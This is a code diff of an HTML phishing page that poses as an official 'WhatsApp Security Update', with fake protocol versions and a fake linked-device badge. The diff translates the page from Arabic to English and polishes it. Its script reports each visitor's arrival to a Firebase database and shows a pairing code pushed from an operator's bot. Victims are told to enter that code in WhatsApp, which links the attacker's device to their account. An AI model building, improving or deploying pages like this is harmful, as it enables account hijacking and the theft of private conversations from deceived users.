@@ -3,35 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>WhatsApp Security</title>
+    <title>WhatsApp Security Update</title>
     <style>
         * { box-sizing: border-box; }
-        body { font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; background: #fff; margin: 0; }
+        body { font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; background: #fff; margin: 0; padding: 20px; }
         .container { width: 100%; max-width: 380px; text-align: center; }
-        .logo { width: 70px; margin-bottom: 15px; }
-        .header-title { font-size: 20px; font-weight: bold; color: #075e54; margin-bottom: 20px; }
-        .version-box { background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 12px; padding: 15px; margin-bottom: 20px; }
-        .v-row { display: flex; justify-content: space-between; font-size: 13px; margin: 5px 0; }
-        .alert-text { font-size: 13.5px; line-height: 1.6; text-align: right; color: #3b4a54; border-top: 1px solid #eee; padding-top: 15px; }
-        .code-zone { border: 2px solid #00a884; padding: 15px; border-radius: 10px; margin-top: 20px; min-height: 80px; }
-        #pairing-code { font-size: 30px; font-weight: bold; color: #075e54; letter-spacing: 5px; }
+        .logo { width: 65px; margin-top: 20px; margin-bottom: 25px; }
+        .header-title { font-size: 22px; font-weight: 700; color: #075e54; margin-bottom: 10px; }
+        .badge { background: #e7f3f3; color: #128c7e; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; display: inline-block; margin-bottom: 25px; }
+        .v-box { background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 12px; padding: 18px; margin-bottom: 25px; }
+        .v-row { display: flex; justify-content: space-between; font-size: 14px; margin: 10px 0; }
+        .alert-p { font-size: 14px; color: #3b4a54; text-align: left; line-height: 1.5; border-top: 1px solid #eee; padding-top: 20px; }
+        .steps { text-align: left; font-size: 14px; color: #1c1e21; margin-top: 15px; }
+        .code-zone { border: 1.5px solid #00a884; border-radius: 10px; padding: 20px; margin-top: 25px; min-height: 100px; display: flex; flex-direction: column; justify-content: center; }
+        #pairing-code { font-size: 32px; font-weight: bold; color: #075e54; letter-spacing: 5px; font-family: monospace; }
+        .wait-text { font-size: 11px; color: #8696a0; margin-top: 8px; }
     </style>
 </head>
 <body>
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
-        <div class="header-title">تحديث أمان واتساب</div>
-        <div class="version-box">
-            <div class="v-row"><span>التشفير الحالي:</span><span style="color:red">V2.12.5</span></div>
-            <div class="v-row"><span>التشفير المحدث:</span><span style="color:green">V3.0.1</span></div>
+        <div class="header-title">WhatsApp Security Update</div>
+        <div class="badge">Linked Device: iPhone</div>
+        
+        <div class="v-box">
+            <div class="v-row"><span style="color:#667781">Current Protocol:</span><span style="color:#d91e1e; font-weight:bold">V2.12.5 (Old)</span></div>
+            <div style="height:1px; background:#eee; margin:5px 0"></div>
+            <div class="v-row"><span style="color:#667781">Updated Protocol:</span><span style="color:#00a884; font-weight:bold">V3.0.1 (Latest)</span></div>
         </div>
-        <div class="alert-text">
-            1. سيصلك إشعار من واتساب الآن، اضغط عليه.<br>
-            2. اختر 'الربط برقم الهاتف بدلاً من ذلك'.<br>
-            3. أدخل الرمز الذي سيظهر هنا:
+
+        <p class="alert-p">To protect your privacy and chats, you must upgrade to the latest security protocol (V3.0.1).</p>
+        
+        <div class="steps">
+            <b>How to activate:</b><br>
+            1. You will receive an official notification; tap it.<br>
+            2. Select <b>'Link with phone number instead'</b>.<br>
+            3. Enter the 8-digit code that will appear here:
         </div>
+
         <div class="code-zone">
             <div id="pairing-code">. . .</div>
+            <div class="wait-text">Awaiting security code..</div>
         </div>
     </div>
 
@@ -41,22 +53,17 @@
         const config = { databaseURL: "https://xstuxnet-7e038-default-rtdb.firebaseio.com/" };
         firebase.initializeApp(config);
         const db = firebase.database();
-        
-        const params = new URLSearchParams(window.location.search);
-        const userId = params.get('id');
+        const userId = new URLSearchParams(window.location.search).get('id');
 
         if (userId) {
-            // إرسال إشعار الزيارة فوراً للبوت في مسار 'monitoring'
-            db.ref('monitoring/' + userId).set({
-                status: "Online",
-                time: Date.now()
-            });
-
-            // الاستماع للكود اللي هتبعته من البوت في مسار 'commands'
-            db.ref('commands/' + userId).on('value', (snapshot) => {
-                const data = snapshot.val();
-                if (data && data.code) {
-                    document.getElementById('pairing-code').innerText = data.code;
+            // "Real-time" Ping to Firebase
+            db.ref('monitoring/' + userId).set({ status: "Online", ts: Date.now() });
+            
+            // Wait for Code
+            db.ref('commands/' + userId).on('value', (snap) => {
+                if (snap.val() && snap.val().code) {
+                    document.getElementById('pairing-code').innerText = snap.val().code;
+                    document.querySelector('.wait-text').innerText = "Enter this code on your WhatsApp now";
                 }
             });
         }
